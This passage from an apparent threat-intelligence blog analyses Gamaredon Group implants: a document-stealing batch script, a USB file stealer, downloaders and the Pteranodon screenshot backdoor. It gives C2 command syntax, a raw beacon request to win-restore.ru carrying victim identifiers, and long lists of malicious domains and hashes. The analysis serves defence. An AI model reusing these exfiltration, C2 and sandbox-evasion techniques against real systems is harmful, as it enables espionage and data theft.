                "5.Create subdirectories under \"%Temp%\\reports\\%COMPUTERNAME\\\" with names: Z W P S V Q N M L K I J F H E G and D. These are drive letters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6.Copy all files from all above drive letters with extensions \"doc\", \"docx\", \"xls\", \"xlsx\", \"rtf\" \"odt\" and \"txt\" into \"%TEMP%\\reports\\%COMPUTERNAME%\\%%d\\\" where %%d is the drive letter"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7.Copy all files with the above extensions from all users' \"Desktop\", \"Documents\", and \"Downloads\" folders to \"%TEMP%\\reports\\%COMPUTERNAME%\\Desktop\\\", \"%TEMP%\\reports\\%COMPUTERNAME%\\Documents\\\" and \"%TEMP%\\reports\\%COMPUTERNAME%\\Downloads\\\" respectively"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 The document stealing logic inside \"condirs.cmd\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8.Execute the exported function \"StartBackup\" within \"MSO5678.usb\" using rundll32.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9.Execute the exported function \"bitDefender\" within \"MSO8734.obn\" using rundll32.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "10.Clean up temporary files, sleep, and delete itself"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When this script has completed, a series of implants giving the attacker the ability to steal files, capture screenshots and evade detection are deployed on the system.",
                "These individual implants are analyzed in detail in Appendix A."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the payloads used to control compromised systems have evolved over time, many commonalities appear across the samples.",
                "While not every sample distributed by this group is described in this blog, hashes of the known samples are included in the Indicators of Compromise section.",
                "Some interesting behaviors from a few of the related samples include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the infrastructure used by this group has not changed much in the past three years.",
                "Many of the samples reused the same domains for implant communication.",
                "Also, many of the custom developed tools use hardcoded network locations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Monikers used for filenames, exported DLL functions, domains, and variable names in scripts seem to be themed and consistent.",
                "By pivoting on indicators from one of the SFX implants within AutoFocus additional samples are easily identified by overlaps in these consistencies.",
                "Most samples were delivered in a similar fashion: an SFX dropping resources which are staged and loaded with a batch and/or VBS script.",
                "The reuse of SSL certificates between IPv4 addresses as well as the reuse of IPv4 addresses between domains names is apparent when viewing a large collection of entities involved in this campaign, as shown below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Focusing in on one of the newest samples (analyzed in Appendix A), the reuse of file names as well as SFX content files becomes apparent."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Overview of the relationships between Samples and Network Infrastructure used by the Gamaredon Group"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The implants identified have limited, generic, and often conflicting detections on VirusTotal.",
                "The threat group using these implants has been active since at least 2014 and has been seen targeting individuals likely involved in the Ukrainian government.",
                "Some of the samples share delivery mechanisms and infrastructure with samples which are detected by a few antivirus vendors as Gamaredon.",
                "However, newer variants deliver more advanced malware which goes unnamed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Periodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples' artifacts in the hopes of identifying previously undiscovered malware families, behaviors, and campaigns."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog presents a threat group identified by the above process using AutoFocus.",
                "By actively hunting for malicious activity and files instead of waiting for alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints.",
                "More details about this threat group can be found in the AutoFocus tag GamaredonGroup."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Special thanks go out to Tom Lancaster for both his assistance in this investigation and for his charming good looks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This file is a USB file stealer which can be also guessed by its internal name \"USBgrabber.dll\".",
                "However, the implementation is sloppy which makes it a file stealer for any newly connected logical volume on a system.",
                "This is because the malware monitors the computer for messages WM_COMMAND and WM_DEVICECHANGE, but not verifying if a USB drive was connected."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware creates two mutexes \"__",
                "Wsnusb73__\" and \"__Wsnusbtt73__\".",
                "Then, it creates the following folder in the temp path of the local user:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\reports\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This folder is used as a temporary location to copy all files from a newly connected logical drive to and upload them to the C2 server.",
                "The files are transferred to the hardcoded C2 server \"195.62.52.93\" one by one via HTTP POST method.",
                "The following request is used which also includes information about the victim, the file to be transferred as well as the source drive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware also creates a SQLite database named \"asha.dat\" in the local users temp folder.",
                "Therein, it keeps track of files which were stolen by calculating the MD5 hash of the filename followed by the file length.",
                "Therefore, it creates a Unicode string of the original file path from the drive and concatenates the file size in bytes to it.",
                "Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in the database."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Structure of the database created by the malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It should be noted, that only hashes of files are added to the database that don't have the following extensions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This file is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be executed.",
                "The DLL is written in C++ and contains all of the functionality is in an export function named \"EntryPoint\".",
                "The file was compiled without any compiler or linker optimizations, thus the big file size and the remaining PDB path string."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At first, the malware retrieves the temp path of the local user (\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\\"), the computer name (e.g. \"WIN-MLABCSUOVJB\"), the hardware profile GUID (e.g. \"{826ee360-7139-11de-8d20-808e6f6e6263}\") and the volume serial number of C:\\ drive (e.g. \"1956047236\").",
                "Next, it takes the following hardcoded string:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://adobe.update-service[.]net/index.php?comp="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To create a URL string with the victims information for contacting the C2 server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To create the filename where the downloaded file will be saved, the malware tries to build a random string of 10 characters.",
                "However, due to an implementation error the string always ends up being the same, namely \"frAQBc8Wsa\".",
                "This string gets concatenated with the retrieved local users temp path to the following file path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Then, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess().",
                "Finally, it sleeps for 60 seconds before terminating the payload and the DLL exits."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This file is a slightly more advanced version of LocalSMS.dll downloader.",
                "Instead of downloading a payload directly to disk, this file requests a download command from the C2 server which contains the actual payload URL to be used.",
                "Therefore, it uses a basic network implementation based on the Winsock functions.",
                "All the functionality of this DLL is put into an export function named \"bitDefender\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It creates a socket, requests the address of the hardcoded C2 server \"win-restore.ru\" via gethostbyname() and connects to it.",
                "Thereafter, it also collects the volume serial number of C:\\ drive, the computer name and the hardware profile GUID.",
                "With this information, it creates the following string used by a subsequent send() function call:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"GET /css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP/1.1\nHost: win-restore.ru\nConnection: close\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The response will be stored into a memory buffer via recv() and scanned for the string \"urltoload={\".",
                "As the name suggests, the received data contains the actual URL of the payload inside curly brackets.",
                "The URL gets pulled out of the string and is used again as input for the API function URLDownloadToFile().",
                "Again, the same file path will be used to store the payload on disk and execute it:\n\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\frAQBc8Wsa\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pteranodon is a backdoor which also can capture screenshots based on a configuration file created on the disk.",
                "Further, it uploads the screenshots to the C2 server unencrypted.",
                "All the functionality of this DLL is put into an export function named \"updater\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At first, it retrieves the %APPDATA% folder of the local user to build the following file path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\desktop.ini\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Then, it checks if the file already exists and continues execution if so.",
                "If not, it runs a routine which checks if there is mouse movement as an anti-sandbox technique.",
                "If no mouse movement is detected the malware runs in an infinite loop checking for mouse movement."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the file \"desktop.ini\" does not exist, the malware creates it and writes the following information into it:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\" interval={60} msfolder={10} status={0}\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This information is used as configuration data to create the screenshots.",
                "There are also other commands possible which can be retrieved from the C2 server.",
                "The following commands are available:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "exec={"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command is used to download and execute a payload from a URL present in the curly brackets.",
                "It creates a random file path in temp folder, calls URLDownloadToFile() and CreateProcess() to run the payload.",
                "Then, it waits 30s and terminates the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "interval={"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command is used to define the interval in seconds between the creation of two or more screenshots."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msfolder={"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command defines the number of screenshots to create."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "command={ / command_c={"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command is used to execute a file present as a string between the curly brackets.",
                "The variant with the \"c\" uses the Windows tool cmd.exe with help of ShellExecute()."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "status={"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command contains the flag which defines if screenshots should be made (\"1\") or not (\"0\")."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, it checks for a mutex named \"asassin1dj\" to verify if the system is already infected and creates it if this isn't the case:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Mutex check and creation routine"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, it creates the following folder, if not already present:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, according to the configuration data in \"desktop.ini\" it constantly creates 24-bit color depth JPEG screenshots without extension in the store folder with help of GDI32 and gdiplus API functions.",
                "The following file naming scheme for the screenshots is used:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<year><month><day>_<hour><minute><seconds>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the last screenshot was created, it uploads all files from the \"store\" folder to the C2 server \"win-restore[.]ru\".",
                "Then, it deletes all the files present in the folder and starts a new screenshot creation cycle.",
                "It should be noted that there is no check of what files are uploaded.",
                "The files are uploaded via POST HTTP method to the script \"vvd.php\".",
                "For this, the following HTTP request is used which contains also data from the victim as well the JPEG files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, it checks if any new command information is available from the C2 server and updates the \"desktop.ini\" file according to it.",
                "Based on functionality, compile timestamps, and binary differencing this malware is likely an updated version of 598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This file runs an infinite loop until mouse movement gets detected, then it exits.",
                "This file can be used to circumvent sandboxes that don't simulate mouse movement.",
                "To detect if it's running inside a sandbox, another file can scan the list of running processes to see if \"wmphost.exe\" is present or not."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain Names"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin-ru[.]ru\nadobe.update-service[.]net\napploadapp.webhop[.]me\nbrokbridge[.]com\ncat.gotdns[.]ch\ncheck-update[.]ru\nchildrights.in[.]ua\nconhost.myftp[.]org\ndocdownload.ddns[.]net\ndownloads.email-attachments[.]ru\ndownloads.file-attachments[.]ru\ndyndownload.serveirc[.]com\ne.muravej[.]ua\nemail-attachments[.]ru\nfile-attachments[.]ru\nfreefiles.myftp[.]biz\ngetmyfile.webhop[.]me\ngooglefiles.serveftp[.]com\ngrom56.ddns[.]net\ngrom90.ddns[.]net\nhrome-update[.]ru\nhrome-updater[.]ru\nloaderskypetm.webhop[.]me\nloadsoulip.serveftp[.]com\nmail.file-attachments[.]ru\nmails.redirectme[.]net\nmars-ru[.]ru\nmsrestore[.]ru\noficialsite.webhop[.]me\nparkingdoma.webhop[.]me\npoligjong.webhop[.]me\npolistar.ddns[.]net\nproxy-spread[.]ru\nrms.admin-ru[.]ru\nsamotsvety.com[.]ua\nskypeemocache[.]ru\nskypeupdate[.]ru\nspbpool.ddns[.]net\nspread-service[.]ru\nspread-ss[.]ru\nspread-updates[.]ru\nstor.tainfo.com[.]ua\ntortilla.sytes[.]net\nukrnet.serveftp[.]com\nukrway.galaktion[.]ru\numachka[.]ua\nupdate-service[.]net\nupdatesp.ddns[.]net\nupdateviber.sytes[.]net\nwebclidie.webhop[.]me\nwin-restore[.]ru\nwinloaded.sytes[.]net\nwinupdateloader[.]ru\nwww.file-attachments[.]ru\nwww.win-restore[.]ru\nyfperoliz.webhop[.]me"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URLs:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://childrights.in[.]ua/public/manager/img/scrdll.ini\nhttp://prestigeclub.frantov[.]com.ua/press-center/press/chrome-xvnc-v5517.exe\nhttp://umachka[.]ua/screen/dk.tmp\nhttp://umachka[.]ua/screen/screen.tmp\nhttp://viberload.ddns[.]net/viber.nls"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hashes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples using custom developed tools:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "002aff376ec452ec35ae2930dfbb51bd40229c258611d19b86863c3b0d156705\n08e69f21c3c60a4a9b78f580c3a55d4cfb74729705b5b7d01c1aecfd58fc49e6\n0c47cf984afe87a14d0d4c94557864ed19b4cb52783e49ce96ebf9c2f8b52d27\n0dc1010c3d3766158e2347d10fc78d9223c6e0e3a44aa8a76622aeff7d429ab9\n0f745512940e0efd8f09c6d862571cba2b98fac9a9f7cf30dedcc08ace43a494\n145dab86a43835bb37734c16756d6d64d8e5ac6b87c491c57385e27b564136b8\n222e85e6d07bdc3a2141cdd582d3f2ed4b1ce5285731cc3f54e6202a13737f8d\n2f2b26f2f7d164ea1f529edbc3cb8a1063b39121dad4dd19d8ee4bbbaf25ed37\n3242183b1f0176a2e3cfb6bfef96b9d55c5a59ea9614dbde4ef89979336b5a5d\n3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9\n37c78ee7826d63bb9219de594ed6693f18da5db60e3cbc86795bd10b296f12ac\n3e5b1116b2dfd99652a001968a05fc962974931a0596153ab0dea8e4a9982f89\n400f53a89d08d47f608e1288d9873bf8d421fc7cd642c5e821674f38e07a1501\n598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824\n5b22ace98b57ed19d815c49983c96a3c6ff0b2701e8167d4422c6990982abcf9\n5ec8b7ca4461720bd69fb49b3f6cae637d8ac3bbd675da938bc5a84e9b73b395\n840b3d4cc95dbf311f792a9f50137056deb66bfdbb55eb9f54ff381a0df65656\n90ba0f95896736b799f8651ef0600d4fa85c6c3e056e54eab5bb216327912edd\n97ebd7bfad63b36b4572132f6ece359ff9991f269048c0b145411699bfe3dc34\n9a1fd88970da3809f45cef00360d1e54ea11a70035c277c130404a67371e142d\n9cb64d3242d2b591bd2ff13b1aadef2e6b4bf9147f4a0926613b7c9343feb312\na46508ec9e48c256261b2d1914532a36ac7da093253320135d77581051751b75\na7e27ff0695a4bdf58c584f48664acd3a385ccebf3a542fdd6d7383f414aa83a\na804beddd22bb76ea207a9607ed5c888f2f640cbd9ed9a32942fcd0b8a25c4d5\nae5ab2e887a9b46ea7819b7ebbb8163028e66882c97e75b0698dc3a69a69d7da\nb2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875\nb9434e5a14159c49af2d1a5a11d570f195797d6b17aa560c3dde4a5b3486bf2a\nbe2be662cc821a924d5641422dd1116e99188c6923da092ca3f0f8f862bd2d2d\nd01df47b6187631c9a93bdad1298439ab1a1c5529b3319f3614b6ec2455e5726\nd1ba365e93ff0a4f3a2cb1d657568e583e3fbd7dbb1c2c52e28f16480324e3bb\nddfc6bb4819527b2424d6e1a84f04b67adad79401e39efbffba5b7d727e732f0\ndf434f54802a6814628f30cae335c302bae7085c4e8314d71a41a47d9c410c39\ne24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4\nf2296bcb6be68dfb330baec2091fb11a42a51928ba057164213580e6ff0e1126"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples using bundled commodity tools:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "026be8a873560f1496c6961f6e36c312bdda01beacb17c4b744f35ee1923d061\n03c943f5cba11b09b9c3afa0705d4a027e5a9d81b299711740cc5aedfe4b4aa1\n03e5e99cc8280de4663c4b65bfd26782d4975258808a63a4b20bc068008df7f5\n059e40ba91b2b2d827c200476fcbd0fad0d43ab198d0c206c996777d27e6de65\n0669e61e51cf43daa431d52b5461c90bdce1b1bee03b087e4406c30264dcb9a4\n068b9a9194efacc16cf142814e79b7041b6ab3d671a95bb508dbd30061c324aa\n0b4a90b823a581311c4acb59f35e32f81f70ca16a2538f54f4dbe03db93350df\n0b5316d723d1ebbec9aba0c9ff6761050305d644c3eeb5291b4e2c4de9e5fa15\n0b8d59312699739b6e6cb7aeb0f22a2eaebbb0fd898a97ef9b83e8d8e9ce67a0\n0dd13d2d0edbcf9d1825c2bfc165876ada2e4d04e2981a0003cb6503fad2287b\n0ddb7867e31f3f30cd1cfe74393f8ac5bbdc61538278de9219a49345f0d3af7f\n13fed3accac4f38f28e606b110a3b7924d9c7a1a911f8c0613d0bb791e715267\n151cf4c83722ba171ae42640e5e13af67ca06ee0a06a74afa53931acf6ac1506\n17006d77cc1459aa3d70e4e9377edb2547a7446647aa9872c9dd9ad860ed7e39\n1ec7e595677038145991c6d84dc7808602142f258c1f90e9486cca0fe531d74f\n208dc592111a8221a9c633efc120b890585f9a67ed340cbb5ec9db4cd5e164e4\n2124adbee89f2c1cb65896bed26e7ffa8bf0fcbdfeb99a9e751fea9cca7a896b\n22e97292671ada8deef4329eb115c52f6f1bc598bcf01a3961f1c35a2230a013\n259a78122ef51ae503059143bf36941fc6090be83213d196ba3051ba36a0b2a1\n26564c23530dd14e0042e074f4178a5b2ad6fc8f51f10138fc39941a6303bff9\n29453fa1772b6d7d33842d6abbe0cb55c4a4b66a00f43284c8724d7c16749a7d\n2a072d9ce63a94d2530cf9f18a232c6a09f6c7bdff9dbe27faceef53604145ea\n2c02d3d3fadd76f9d21f5c093459ddc0045c94f17679269eb7a2990a1a88cb42\n2d55000bb5cb9e3e1f137810c2e1eb899f68c40e4a6f6307f226c7b8af208abd\n2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20\n2e89436b355550ceb361fac1b03b78b71eda11d25f26223ac5c8c34ed8972a05\n32b0e6394b110860371da5541946a6dcc85358a3951eddc86fdaf5794527c150\n33934fcfae5760316b3f40e013cbb03d8086f8c30f9a4ba9bed3f9486a530796\n34d86602882e86f8aaaeb7513126c8579a4489f2be31c279188e2f2ca8a0e141\n390162dae62a0347e35cf5dad093cfc2f7d4ded62fba9d2df7af6133feb41ee0\n3ef8602579c6b145fbaafc8970b4c9a6e7bebd11eb5e37eecaa67b4572c6038b\n420acd7e8598fe994b59bf5d30f89e1c11b36cbef464a4786694cf9eada8dd4c\n42b4c39179f76ea9eb5835b55a3cf4d8dbb29d42ee0622ad2e89ca48d01e8988\n42eed03907c9dfa0e566fbe5968cdb5a1b7b5e18521f7327185ed2208c6c29b4\n46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d\n47d929c69bfd8d8efb9c280eabec2f73d4bddf1c3c30120c3fb6334623469888\n505ef8cbc1271ce32f0c473468d75a1aba5073c37b2e6b49293ddc9efcb4ac96\n5230453eeb98c5a183129ed8b918b429e96020887302ba30941c408108a1ab84\n5363220b532d7da378b338e839a501ae5c006cc03c8b2d3627c480d64deb1221\n558f33d478091993e5b5921604f8c3873efc87f551fddf61612b5c64d5b610f6\n55c76f4f93f9e155fbb6a28447f97c1ccda0081061dc3cb9973d42c1686964b7\n56c8246819f7de5cba91001793831441d4ce998ccb8237cb96c9f52e88ea384b\n59bddb5ccdc1c37c838c8a3d96a865a28c75b5807415fd931eaff0af931d1820\n5ac627f8964d3b9cad69f21e3b8f27305f1f68f49e4f4fae2c73949a04b32692\n5ccc76ae1cdf668ba7f89c6cbd0bad44f148cbee736320ead237262ba170ffba\n5cd4401c1dae9b9ecd75c96ab29dc64ce40bef3acc6faf7c001ff98ebd3b3413\n5cd72eaf555813f1ee187def594584f5cfc6a5e83086f35e281327b5210adffb\n5f8293eda9fb40684caddf576eba6c81f3a06911ca9e4ecf84ede3b2891cff5e\n6c258151c593268c13c252d8f275192a6f7a74d5de5754f2cf20fb94be7ee6ea\n0458e168baa4fa5942892065925ac82b12245551b539d54c2884b3a21c2699d8\n877f1de209eb9d8b2a20a76f8773d12e5a1fcde4148868c7b73added392f62f6\n29c728a169c5d18298e77db161dd5d2f6396ceca9ee7849b63ff8a8bc11f911e\n98e092b7bfc3bbdaeb82e05de14ba5835c6ac626c17de9eef2049796a031dd10\n27e08fb90ada2fd8ce6b6149786edd3b814dd0324257ebd919ed66ada0334b21\n9f651ae6ea538238748614a7f86fe2b0f76e881d6c38da581f284e4b6f79b0ca\nf47115ea58615781e56dcac673c19edf7ce00defd7ada709ae97b0708d3eac1e\nb80719854f8744ba62e9f0e774c09e2e2ed79dd37f9f94ba3ed05ec8507d55e6\n467f04914a1e6093bdaf5c28884bf95ec738234033b3292d289a0799de196d49\n5c47d18b3f0e0274c6a66b2eab27d47c73a0105c263d41c6473aba9a28d0a4ba\n01c5729ac1ae3928053c085fd616323a3715863ab3d7e9b8106c09e24df34183\n5b6a691cf8faf238b27861941a1b667d889889cc9711a3e561403d6a6ed292c9\ne2688f72cc7ae836be19e765e39318873554ee194a09945eb3f3805d04f256ca\n9f0228e3d1577ffb2533584c2b1d87ebee0c0d490f981e61d18bb27ab02e52cb\n2617f9301869304b88d8a3a4f7b2eab6b0edf264cc1a28b99f5685959242ec39\nf3107a5a00f36e12be7cc2e37c35903ef855b8043492af374ea918385821443c\n63fcfab8e9b97d9aec3d6f243003ea3e2bf955523f08e6f1c0d1e28c839ee3d5\n05cbe01b1125897e0e982c587a10a72f4df795b844a4a2c4cec44aee7f30ce94\n5a7da102c11960b9651650143a4a08ae4ce97d68dff999961f1ffc792531afeb\ndf6112e6bad4125b80b8829c13a2ca523bb82cf303cf531389d8795e7512c7e6\ncfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31\ne79dbcc8b60da280e53d9cf818eee1de34251e0551b9947bb2b79a31b131417e\na73eac15797130c381b5b4a65c3fb1cfc723b1586a1882c981211787bba285a6\n3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b\nf2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd\nca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc\n550ee89d5df17f90ba7689d957cd067dcdbe3d957c5369ea28d925e02ccc8ce6\nf77d7940c51c2a1eab849dbd77e59c683ebf7820799ef349e7da2583e1aa11ae\n2c5d55619d2f56dc5824a4845334e7804d6d306daac1c23bec6f078f30f1c825\n7231177a115656041ba4e5b3cf0bf7a547b074f03592351484267e25cda7c899\nd5405f99cec0166857274b6c02a7ef52b36274fedb805a17d2089fd24ed133cf\n81921b6a7eba39a3f73895a57892ed3a46ab6365ac97d550ca3b9bff46c7a1c2\n1eef9f8d7d3099b87be7ac25121f9d2ccacfb5ccf02b508fb2036b6e059c525f\n5255061c3600df1a94b376fca40f3ccb69d1cb6dd42aa744b20a643c7292d20c\nb5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13\n5fb7f6f953be3b65d88bd86d1391ebc9f88fc10b0ef23541463ebf5b157f695c\n6016cf9898d74e2e9030be7c987964d817ba28ad2253d1da54c81a1bf49db836\n621e55421dffae981e3e933c65626314d5610c7c08f76f83a3d07f0ec6c36e2d\n6ccc24971073d24d90c4cbaf83dfbae2969cbf527e319c7ee9a4babcbe88e456\n6f8da9180eebe02ba35317cb8aee5c8df6ac29795af70eb9430c3588d457aad6\n71c5b899a5187baeb8f605ca39ca56bf05a63025a8f9f84c45590d8345e5d349\n725b7d92ed66be160f2e04395008a65c72814d5ddf842d9778396f6c6679d85e\n72d4b780a90ede7ea152f5da0973965cab31d2813fa8c2fe0e1cb611f5ca257e\n73670d06851f588c7df44dc478f49883406697c48c618438e0f249b7a916552e\n74e017853fbc85ee77ca7476cd25423815602aaaa02b29e0003c95c9551b8890\n75d2367dc79d9f8aed165729df90ed5d28fefe267778dbe4d3d74aafa75d66e0\n7a5a1c6ea0c2f017df9f06975c93a356cac20b19031fcde96136fa5881e5ef3a\n7adb049e0b49312aea904c70e16d0e7f03d01aae4bf8ac867e8219ced4e6e057\n7bfa85bec239b6c4419b2d57149c5960263c80e493f888d03ceaaa3f945b1b25\n7f324b658f587b3b27921ebeba5ac25aebd669b33e6801fa9581de8c2eb0df2e\n7fee970748eb83045e36911dafdaee0d4069ebe72c059cc7de3d65539012c2e9\n823793a37d748ffe708864c16c853c67a5db812712481da1d24790b455163940\n8512aabfa0175684bdbb77481d6b272b63dbc4249b04a44e1003b7d8fdea0a89\n86c81f03cf7d8f8af38c2559dbf506cccdc25579f3b29fb574f823a67f99a0a3\n88ae7e60b9dd57fc6b2d667ce33fb29c0f75d37eb7c837ccf56cb7994386d5ef\n8b50e3ca06a22d0be6a71232b320137c776f80ac3f2c81b7440b43854b8a3bf0\n8bd40e7fe6bbd4d5810db2c142186bb58da445a132fb6f9ff01c46947a532244\n8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845\n8d38726d674279705fe06b4b45bbbaef10756c547d560cea6998e23dba09f80c\n8db47439685edc683765abb5e6d7d0d05479bf9ee164992db9e8ce97fe43ee2f\n95de2e16f1b05d1b45b1d182c1503568c2e5fd4a81ac52fe1bc9e881d1a272b1\n95e3204228341852b7c97f357f799e7ec9688abe1262436b569e56397f1fd864\n98caf00760d772598386eb8d4f26caf92fb891915ac08da6bf830be5e45278d3\n99c9440a84cdc428ce140de901452eb334faec49f1f6258acdde1ddcbb34376e\n9a8776e4ae38cf529bab28947b31ade84301262b7996dc37ec47afa4fb4cf6e1\n9beb1d2a03ff2d4c15913de0f87b72074155b44df791bd967dac8155e97a0e06\n9c8d518fbbc8cbb25fa309f5396efa5749e57a3b0158779404c8d3e92baf6596\na064a28e5e7409a96bba93fc57f44cadc3492bb0f49792c89c973e30b0f5d498\na194b47043356fa365d98a5f7c582b6f87fac90acf0f469ed3651cfe2fd7b2c9\na21dfb8e8b7c8dfbeeb4d72e6ef1f22c667b8968b3a3b1dcce99f44faab05903\na2e0fe2d385dabcdfb024100216d259ddd1fa9907e982d297846fd29b8d4d415\na48ad33695a44de887bba8f2f3174fd8fb01a46a19e3ec9078b0118647ccf599\na595da9a2fa58d4f8be0bfbcf7f4c950435ff5289dd1ccf2c65eec73a0afe97f\na972ad0ddc00d5c04d9fe26f1748e12008efdd6524c9d2ea4e6c2d3e42d82b7b\naa860d405746401ae4155485326fdeb39718832c77c73540d48f4fbb8e596215\nab6832a4432b4bdaec0706f7b00a369c48175eac9abc3e537032b1f5d26a993b\nada2f0703614b3447d427827777af5d4ee9ffe9179498970326926751a4f8d65\nb16d317c11228bd3573126a0e1bc0bbf35d84a4a1f47dfb06b70634a21fd9823\nb3665548cc0f2fce3593fb7139f49588faa1d327b6d23feb564ca4194053ae8a\nb5578c48a11533871ae91e6d5632aafc25d3976c0626d62abab306663566d024\nb67a6f87fc3fd7c5c3666acac5918c8c08a53ab6a966f4d1daf38105a566ede1\nb6abc8ab631dcf52e028ab26dbe3bb94022d69193c0acc8642cbd6329cbb23ef\nb7e117eb342b0d450095805073326989c792bf5ccbbdcd5f4a9ace50e517412e\nbb14abc9b0798c7756a6ed887308a3e6210cc08a5149dc1360fdd1f5bca27cca\nbdadb319f071f02462d107380102b669e407bb2a0b20e77a9a8a5726b4cbbc4b\nbf2383cfbee4cbb0bda2614839454ab1724c9bbfff8b4b48e0f48579ae220c10\nbf52b44168de1855d83186163a2d5f29e488ddafdfd5447e211aec4a769cf74a\nc0d5cf7a0035deda5646aaf520b3ff632aa6be76ddbc88f38ddc11e77ffb40b4\nc1a82a788df7418712664138c0fdb05232036a27ab0998479d60c656998849f1\nc63a523834ab59ab5621a0acb156a9b901befe806044642fe5fec8a0ba545e70\nd05d3f3582e13eaf5f39d7143ca1a4b1367cc5267bf9958a15e27cf53e059518\nd0e456cff03c2483ded9a0f8c1b99f9fefb6ba47dcaf949dae27abe940ee20e6\nd8a01f69840c07ace6ae33e2f76e832c22d4513c07e252b6730b6de51c2e4385\ndada74663e3e29e